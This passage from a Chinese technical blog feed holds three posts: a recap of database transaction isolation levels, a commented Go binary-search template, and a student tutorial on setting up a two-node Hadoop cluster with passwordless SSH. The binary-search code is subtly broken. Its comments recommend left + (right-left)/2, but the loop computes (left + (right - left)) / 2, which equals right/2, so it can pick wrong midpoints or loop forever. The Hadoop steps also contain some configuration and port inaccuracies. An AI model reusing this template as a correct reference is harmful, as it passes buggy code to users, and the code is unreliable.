<p>我们首先回顾了一下教科书上关于事务的定义：ACID已经他们的具体内涵。然后我们对于其中的 隔离性 进行了进一步的探讨。隔离性的关键在于使得并发执行的事务们能够假装自己在串行化处理。由于串行化本身的过慢的效率，人们提出了各种弱隔离级别的方案，牺牲了部分的隔离性换取执行效率。</p>
<p>读-提交隔离级别提供了最基础的能力，防范脏读和脏写的问题。</p>
<p>快照隔离级别使将读、写分离，从而解决了读倾斜的问题。</p>
<p>更新丢失是另外的一个问题，有些数据库的快照隔离能够自动处理，而另外一些需要手动解决（例如 MYSQL）</p>
<p>解决了读-写问题后，我们却对一些面对写-写并发的情况开始无能为力，并有了写倾斜和幻读这两个问题。最终，我们表示qtmd弱隔离，串行化真香！并介绍了几种串行化的实现。</p>
<p>下面是一些参考资料和拓展阅读资料。</p>
<p>Thanks for coming.</p>
<h2 id="参考资料与拓展阅读"><a href="#参考资料与拓展阅读" class="headerlink" title="参考资料与拓展阅读"></a>参考资料与拓展阅读</h2><p>DDIA，第七章</p>
<p><a href="https://tech.meituan.com/2014/08/20/innodb-lock.html" target="_blank" rel="noopener">Innod Bob 中的事务隔离级别和锁的关系</a></p>
<p><a href="https://juejin.cn/post/6844903782329876494" target="_blank" rel="noopener">谈谈数据一致性</a></p>
<p><a href="http://ouyym.com/wen/20383/" target="_blank" rel="noopener">MVCC多版本并发控制</a></p>
<p><a href="http://coding-geek.com/how-databases-work/" target="_blank" rel="noopener">How does a relational database work</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>数据库系统</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>二分算法细节详解</title>
    <url>/2021/07/18/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95%E7%BB%86%E8%8A%82%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>做了忘忘了做，毁灭吧二分</p>
<a id="more"></a>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">binarySearch</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// 旨在给出一个通用模板, 包括了普通二分、最左二分与最右二分</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 搜索区间 *******/</span></span><br><span class="line">    <span class="comment">// left、right 为搜索区间的边界</span></span><br><span class="line">    <span class="comment">// 搜索区间为: [left, right], 左闭右闭</span></span><br><span class="line">    <span class="comment">// 这要求稍后的 while 条件必须为: left &lt;= right</span></span><br><span class="line">    <span class="comment">// 即终止条件为: left = right + 1</span></span><br><span class="line">    left := <span class="number">0</span></span><br><span class="line">    right := <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 中位数 mid *******/</span></span><br><span class="line">    <span class="comment">// mid 为 (left+right)/2</span></span><br><span class="line">    <span class="comment">// mid 向下取整, 例如 left = 1; right = 2; 则 mid = 1</span></span><br><span class="line">    <span class="comment">// mid可能会存在数据溢出的情况，以下四种取 mid 的方法：</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mid1 := (left + right) / 2</span></span><br><span class="line">    <span class="comment">// mid2 := (left + right) &gt;&gt; 1</span></span><br><span class="line">    <span class="comment">// 当 left+right &gt; INT_MAX_VALUE 时，这两种情况均可能会导致整型溢出</span></span><br><span class="line">    <span class="comment">// 第二种方式使用位移运算代替除法，可以提高性能。</span></span><br><span class="line">    <span class="comment">// 在 golang 中，int 的位数至少为 32 位，取决于平台。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mid3 := (left + (right - left) / 2)</span></span><br><span class="line">    <span class="comment">// mid4 := (left + (right - left) &gt;&gt; 1)</span></span><br><span class="line">    <span class="comment">// 这两种方式可以避免整型溢出</span></span><br><span class="line">    <span class="comment">// 第四种方式使用位移运算代替除法，可以提高性能。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 判断函数 *******/</span></span><br><span class="line">    <span class="comment">// 我们的目标是，找到数组中符合某种条件的数字。</span></span><br><span class="line">    <span class="comment">// 使用 isMatch(a) 表示该数字是否符合条件</span></span><br><span class="line">    <span class="comment">// isMatch(a) 的返回值为 int，其实是三种情况：</span></span><br><span class="line">    <span class="comment">// 1. a 满足匹配条件, 返回 0。</span></span><br><span class="line">    <span class="comment">// 2. a 不满足匹配条件，且满足条件的数字在 a 的右侧, 返回大于 0 的数字。</span></span><br><span class="line">    <span class="comment">// 3. a 不满足匹配条件，且满足条件的数字在 a 的左侧, 返回小于 0 的数字。</span></span><br><span class="line"></span><br><span class="line">    isMatch := <span class="function"><span class="keyword">func</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">        <span class="comment">// if ...</span></span><br><span class="line">        <span class="comment">// return 1</span></span><br><span class="line">        <span class="comment">// if ...</span></span><br><span class="line">        <span class="comment">// return -1</span></span><br><span class="line">        <span class="comment">// if ...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 多个符合预期的数 *******/</span></span><br><span class="line">    <span class="comment">// 假设我们想要最简单的二分查找</span></span><br><span class="line">    <span class="comment">// nums:  [1, 2, 3, 3, 3, 4, 5]</span></span><br><span class="line">    <span class="comment">// index:  0, 1, 2, 3, 4, 5, 6</span></span><br><span class="line">    <span class="comment">// target: 3</span></span><br><span class="line">    <span class="comment">// 可见，满足条件的数字下标为：2、3、4;</span></span><br><span class="line">    <span class="comment">// 我们有三种需求：a）找到任意一个满足条件的数；b）找到最左侧的满足条件的数；c）找到最右侧的满足条件的数；</span></span><br><span class="line">    <span class="comment">// 预期解答依次为：a）2/3/4;                b) 2;                   c) 4;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于第一种，我们找到任意一个满足条件的即可返回 mid</span></span><br><span class="line">    <span class="comment">// 对于第二种，我们在找到满足条件的数字时，依旧需要将区间向左缩小。</span></span><br><span class="line">    <span class="comment">// 直到 left == right+1, 最左侧的边界为 left</span></span><br><span class="line">    <span class="comment">// 对于第三种，我们在找到满足条件的数字时，依旧需要将区间向右缩小。</span></span><br><span class="line">    <span class="comment">// 直到 left == right+1, 最右侧的边界为 right</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 区间变动 *******/</span></span><br><span class="line">    <span class="comment">// 由于我们的搜索区间为闭区间，所以若 mid 不满足条件，我们可以直接将其排除在下一次区间之外。</span></span><br><span class="line">    <span class="comment">// if isMatch(a) &gt; 0 &#123;</span></span><br><span class="line">    <span class="comment">//  left = mid + 1</span></span><br><span class="line">    <span class="comment">// &#125; else if isMatch(a) &lt; 0 &#123;</span></span><br><span class="line">    <span class="comment">//  right = mid - 1</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 mid 满足条件，那么需要考虑是上述三种情况的哪一种。</span></span><br><span class="line">    <span class="comment">// a) 情况不用说，直接返回 mid 即可</span></span><br><span class="line">    <span class="comment">// b) 情况需要将区间向左缩小。right = mid - 1</span></span><br><span class="line">    <span class="comment">// c) 情况需要将区间向右缩小。left = mid + 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> left &lt;= right &#123;</span><br><span class="line">        mid := (left + (right - left)) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isMatch(nums[mid]) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// nums[mid] 不满足匹配条件，且满足条件的数字在 mid 的右侧</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> isMatch(nums[mid]) &lt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// nums[mid] 不满足匹配条件，且满足条件的数字在 mid 的左侧</span></span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> isMatch(nums[mid]) == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// a) 找到一个即可</span></span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">            <span class="comment">// b) 找最左边界, 向左缩小区间</span></span><br><span class="line">            <span class="comment">// right = mid - 1</span></span><br><span class="line">            <span class="comment">// c) 找最右边界, 向右缩小区间</span></span><br><span class="line">            <span class="comment">// left = mid + 1</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/******* 返回值与检查 *******/</span></span><br><span class="line">    <span class="comment">// 上述行为并不一定能够保证找到满足条件的解，数组也可能不存在满足条件的解。</span></span><br><span class="line">    <span class="comment">// 所以需要进行结果检查，如果 isMatch(a) 不满足，说明数组中不存在目标解。</span></span><br><span class="line">    <span class="comment">// 此外，left 和 right 都有可能超出边界。</span></span><br><span class="line">    <span class="comment">// a): 并不需要额外检查，如果走到这一步说明确定没有解，返回 -1 即可</span></span><br><span class="line">    <span class="comment">// b): 需要检查 left 是否越界，或 nums[left] 不满足要求</span></span><br><span class="line">    <span class="comment">// c): 需要检查 right 是否越界，或 nums[right] 不满足要求</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// a) 找到一个即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="comment">// b) 找最左边界, 向左缩小区间</span></span><br><span class="line">    <span class="comment">// if left &gt;= 0 &amp;&amp; isMatch(nums[left]) == 0&#123;</span></span><br><span class="line">    <span class="comment">//  return left</span></span><br><span class="line">    <span class="comment">// &#125;else&#123;</span></span><br><span class="line">    <span class="comment">//  return -1</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// c) 找最右边界, 向右缩小区间</span></span><br><span class="line">    <span class="comment">// if right &lt;= len(nums)-1 &amp;&amp; isMatch(nums[right]) == 0&#123;</span></span><br><span class="line">    <span class="comment">//  return right</span></span><br><span class="line">    <span class="comment">// &#125;else&#123;</span></span><br><span class="line">    <span class="comment">//  return -1</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>屠龙术</category>
        <category>算法与刷题</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>二分</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Hadoop与HBasesse</title>
    <url>/2020/10/26/%E6%90%AD%E5%BB%BAHadoop%E4%B8%8EHBasesse/</url>
    <content><![CDATA[<p>本文是记录大三上学期方向必修课 《数据管理技术》的上机实验。本学期共有四次实验。</p>
<ol>
<li>Hadoop环境搭建与配置 </li>
<li>HBase数据库的部署与配置 </li>
<li>Redis数据库的部署与配置</li>
<li>Redis中数据类型使用及命令使用 </li>
</ol>
<p>本文将主要记载前两个实验</p>
<a id="more"></a>
<h2 id="实验一-Hadoop环境搭建与配置"><a href="#实验一-Hadoop环境搭建与配置" class="headerlink" title="实验一:Hadoop环境搭建与配置"></a>实验一:Hadoop环境搭建与配置</h2><p>本次实验目标是配置Hadoop，版本采用目前的最新版（<a href="https://hadoop.apache.org/releases.html" target="_blank" rel="noopener">Hadoop 3.3.0</a> 和 <a href="https://hbase.apache.org/downloads.html" target="_blank" rel="noopener">HBase 2.3.2</a>）。方式为使用两台虚拟机搭建一主一从的完全分布式环境。</p>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>在 Apache 官网上下载 Hadoop 安装包，注意：Apache通常会给一个source版本和一个binary版本，这两者的区别： SRC版本包含源码，主要给高级开发人员准备，可以去修改其中的源码改变或扩展功能。 BIN版本主要是一般开发人员或使用者准备，只需要使用其固化功能即可，我们下载后者即可。</p>
<p>在 VMware 中新建两台虚拟机。我们这里使用的版本为 <code>ubuntu-18.04.4</code>，暂时我们只需要创建一台，稍后再克隆过去即可。有关如何使用VMware创建虚拟机在此不表。</p>
<p>创建成功后，换源，安装必要的包，略去不提</p>
<h3 id="安装JDK和SSH"><a href="#安装JDK和SSH" class="headerlink" title="安装JDK和SSH"></a>安装JDK和SSH</h3><p>接下来我们安装 <code>jdk</code> 并配置Java环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E6%90%AD%E5%BB%BAHadoop-%E5%AE%89%E8%A3%85jdk.png" alt="安装jdk"></p>
<p>输入 <code>java -version</code>,检查是否安装成功。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/26/java-version.png" alt="Java version"></p>
<p>配置Java环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>将以下内容复制进去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Java Environment</span></span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>保存后运行 <code>source ~/.bashrc</code> 使修改生效。输入 <code>export</code> 检查是否有Java路径。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/java%E7%8E%AF%E5%A2%83%E8%B7%AF%E5%BE%84.png" alt="java环境路径"></p>
<p>接下来我们安装 <code>SSH</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">ssh localhost</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>此时我们安装好了<code>ssh</code>. 关于<code>ssh</code>的设置先告一段落，我们先克隆一份新的虚拟机。</p>
<h3 id="克隆虚拟机并完成互连"><a href="#克隆虚拟机并完成互连" class="headerlink" title="克隆虚拟机并完成互连"></a>克隆虚拟机并完成互连</h3><p>将刚才的虚拟机关机，在VMware中克隆刚才的虚拟机，命名为slave。关于如何克隆虚拟机在此不表。</p>
<p>克隆成功后，新旧虚拟机是完全一样的。为了区分我们需要在新虚拟机中修改系统名，并在两台机子中修改<code>IP</code>映射。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改系统名</span><br><span class="line">sudo vim &#x2F;etc&#x2F;hostname</span><br><span class="line"># 将文件内容改为 &quot;slave&quot;</span><br><span class="line"># 当然你也可以回去把主机的系统名修改为master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为我来回做了两边，所以有些截图的名称，路径与IP不太对，以文字为准</p>
</blockquote>
<p>接下来修改IP映射，先在两个虚拟机内执行指令 <code>ifconfig</code> 找到 IP 地址并记录。提示：该指令可能需要安装<code>net-tools</code>包。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改IP映射</span><br><span class="line">sudo vim &#x2F;etc&#x2F;hosts</span><br><span class="line"># 在文件结尾加上IP地址+系统名，例如</span><br><span class="line">192.168.127.140 master</span><br><span class="line">192.168.127.141 slave</span><br><span class="line"># 这一步在两个系统中都要做</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E4%BF%AE%E6%94%B9IP.png" alt="修改ip"></p>
<p>我们在两台虚拟机内互相<code>ping</code>下对方，检查是否成功互连。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># master</span><br><span class="line">ping slave</span><br><span class="line"># slave</span><br><span class="line">ping master</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/mpings.png" alt="m-ping-s"></p>
<h3 id="虚拟机间SSH免密登录"><a href="#虚拟机间SSH免密登录" class="headerlink" title="虚拟机间SSH免密登录"></a>虚拟机间SSH免密登录</h3><p>在主机下生成<code>SSH</code>密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;.ssh&#x2F;</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>连续三次回车，第一次将 Key 存放于默认位置(<code>~/.ssh/</code>)，第二次和第三次是设定密码为空。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E9%85%8D%E7%BD%AEssh-%E5%85%8D%E7%99%BB%E5%BD%951.png" alt="生成密钥"></p>
<p>继续执行以下语句，设定免密登录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch authorized_keys</span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line">cat ./id_rsa.pub &gt;&gt; ./authorized_keys</span><br></pre></td></tr></table></figure>
<p>这时我们登录本机<code>SSH</code>就不需要密码了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 免密登录本机SSH</span><br><span class="line">ssh localhost</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：有人（其实就是我）可能会需要以下报错：</p>
<blockquote>
<p>The authenticity of host ‘localhost (127.0.0.1)’ can’t be established</p>
</blockquote>
<p>请参考本节最后的常见问题</p>
</blockquote>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E9%85%8D%E7%BD%AEssh-%E5%85%8D%E7%99%BB%E5%BD%952%28%E6%88%90%E5%8A%9F%29.png" alt="本地免密2"></p>
<p>将公钥文件复制到slave下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp ~&#x2F;.ssh&#x2F;authorized_keys slave:~&#x2F;.ssh</span><br></pre></td></tr></table></figure>
<p>切换到<code>slave</code>虚拟机，生成<code>ssh</code>密钥，再把刚才的文件移动到<code>.ssh</code>下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;.ssh&#x2F;</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">mv authorized_keys ~&#x2F;.ssh</span><br></pre></td></tr></table></figure>
<p>回到<code>master</code>, 尝试免密登录<code>slave</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh slave</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E9%85%8D%E7%BD%AEssh-%E5%85%8D%E7%99%BB%E5%BD%95slave3%28%E6%88%90%E5%8A%9F%29.png" alt="免密登录slave3"></p>
<p>至此虚拟机间SSH免密登录完毕。</p>
<h3 id="安装Hadoop"><a href="#安装Hadoop" class="headerlink" title="安装Hadoop"></a>安装Hadoop</h3><p>每个节点的Hadoop配置都一样，由于我们刚才已经在节点之间建立了SSH链接，所以我们只在<code>master</code>中安装配置，稍后直接将它们复制到<code>slave</code></p>
<p>切到刚才下载好<code>hadoop-3.3.0.tar.gz</code>的文件夹，执行下列命令安装。为了方便我们把解压出来的文件夹命名为<code>hadoop</code>, 并把它移动到<code>/usr/local</code>下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf hadoop-3.3.0.tar.gz -C &#x2F;usr&#x2F;local</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">mv hadoop-3.3.0 hadoop</span><br><span class="line">chown -R hadoop .&#x2F;hadoop</span><br></pre></td></tr></table></figure>
<p>然后加入<code>Hadoop</code>的环境变量，方法同 Java 的环境配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>将以下内容复制进去，请注意这里的<code>HADOOP_HOME</code>应该是根据你的安装目录有所变动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Hadoop Environment</span><br><span class="line">export HADOOP_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;hadoop</span><br><span class="line">export CLASSPATH&#x3D;$($HADOOP_HOME&#x2F;bin&#x2F;hadoop classpath):$CLASSPATH</span><br><span class="line">export HADOOP_COMMON_LIB_NATIVE_DIR&#x3D;$HADOOP_HOME&#x2F;lib&#x2F;native</span><br><span class="line">export PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;bin:$HADOOP_HOME&#x2F;sbin</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的一个坑在于：配置语句对字段规范要求非常严格，例如等号左右不能多空格，4空格!=1tab</p>
</blockquote>
<p>保存后运行 <code>source ~/.bashrc</code> 使修改生效。输入 <code>hadoop version</code>，如果出现 Hadoop 版本即说明安装成功。接下来开始配置完全分布式环境。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E5%AE%89%E8%A3%85Hadoop%28%E6%88%90%E5%8A%9F%29.png" alt="安装Hadoop"></p>
<h3 id="配置Hadoop分布式环境"><a href="#配置Hadoop分布式环境" class="headerlink" title="配置Hadoop分布式环境"></a>配置Hadoop分布式环境</h3><p>切到 <code>/usr/local/hadoop/etc/hadoop</code> 文件夹，修改 <code>hadoop-env.sh</code> 文件，主要是指定 <code>JAVA_HOME</code>，在文件开头部分找到被注释掉的 <code>export JAVA_HOME=</code>，将其取消注释，并将等号后面的路径修改为之前的 <code>JAVA_HOME</code> 环境变量的值，在本文的示例中即为 ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64</span><br></pre></td></tr></table></figure>
<p>修改 <code>core-site.xml</code> 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">             &lt;name&gt;fs.defaultFS&lt;&#x2F;name&gt;</span><br><span class="line">             &lt;value&gt;hdfs:&#x2F;&#x2F;localhost:9000&lt;&#x2F;value&gt;</span><br><span class="line">        &lt;&#x2F;property&gt;</span><br><span class="line">         &lt;property&gt;</span><br><span class="line">             &lt;name&gt;hadoop.tmp.dir&lt;&#x2F;name&gt;</span><br><span class="line">             &lt;value&gt;file:&#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;tmp&lt;&#x2F;value&gt;</span><br><span class="line">             &lt;description&gt;Abase for other temporary directories.&lt;&#x2F;description&gt;</span><br><span class="line">        &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
<p>注:上面第一个配置决定<code>hadoop</code>的<code>namenode</code>；第二个配置了储存<code>hadoop</code>执行过程中的临时文件地址,如果你的<code>Hadoop</code>不是安装在<code>/urc/local</code>的话,需要根据自己的实际情况进行更改.</p>
<p>修改 <code>hdfs-site.xml</code> 文件，在 <code>&lt;configuration&gt;</code> 节加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.replication&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;1&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.name.dir&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;file:&#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;tmp&#x2F;dfs&#x2F;name&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.datanode.data.dir&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;file:&#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;tmp&#x2F;dfs&#x2F;data&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">     &lt;name&gt;dfs.http.address&lt;&#x2F;name&gt;</span><br><span class="line">     &lt;value&gt;0.0.0.0:50070&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure>
<p>注：上面第一个配置每一个文件存储几份，默认的是3，但我这里只安装了1个slave，也就是只能存储1份。</p>
<p>修改文件系统 <code>yarn-site.xml</code> 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.aux-services&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;mapreduce_shuffle&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.env-whitelist&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
<p>修改计算框架 <code>mapred-site.xml</code> 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.framework.name&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;yarn&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.env-whitelist&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
<p>添加<code>workers</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch workers	# 如果没有</span><br><span class="line">vim workers</span><br></pre></td></tr></table></figure>
<p>在打开的文件里填写你的从节点名，例如我这里填写<code>slave</code>即可。</p>
<p>在<code>Hadoop 2.0</code>版本，这个文件名为<code>slaves</code>,灯塔国真是奇奇怪怪的政治正确。</p>
<hr>
<p>到此，我们已经在主节点中配置好了<code>Hadoop</code>，接下来我们将刚才配置的所有文件直接通过<code>ssh</code>传送给从节点。</p>
<p>将Hadoop发送到从节点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;</span><br><span class="line">scp -r hadoop slave:~&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这一步可能会出现各种各样的问题，祝你好运</p>
</blockquote>
<p>切换到<code>slave</code>机，将刚才传来的文件夹放入我们的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">sudo mv hadoop&#x2F; &#x2F;usr&#x2F;local&#x2F;</span><br></pre></td></tr></table></figure>
<p>保存上述文件，然后回到主机开始准备格式化 <code>NameNode</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;bin</span><br><span class="line">hdfs namenode -format</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：如果你是第一次进行到这，应该问题不大。如果你已经是第N次格式化，可能会有报错：需要先将之前的data文件等删除，具体见本节最后的常见问题</p>
</blockquote>
<p>(主机上)启动 <code>Hadoop</code> 检查我们的配置结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;sbin</span><br><span class="line">start-dfs.sh</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<p>在输出中出现 <code>Jps</code>、<code>NameNode</code>、<code>DateNode</code>、<code>SecondaryNameNode</code> 和 <code>ResourceManager</code> 即为成功。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/jps%E6%88%90%E5%8A%9F.png" alt="主机jps"></p>
<p>(从机上)只需要输入<code>jps</code>,如果输出出现 <code>Jps</code>, <code>DataNode</code>即为成功</p>
<p>访问 <code>localhost:50070</code> 可以查看到下列页面</p>
<p>注：Hadoop3为9868端口</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/Hadoop%E6%88%90%E5%8A%9F-9868.png" alt="Hadoop成功-9868"></p>
<p>访问 <code>localhost:8088</code> 可以查看到下列页面</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/Hadoop%E6%88%90%E5%8A%9F-8088.png" alt=""></p>
<p>我们可以选择左侧的<code>Node</code>页面查看当前节点。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/Hadoop%E6%88%90%E5%8A%9F-8088Nodes.png" alt="Hadoop成功-8088Nodes"></p>
<hr>
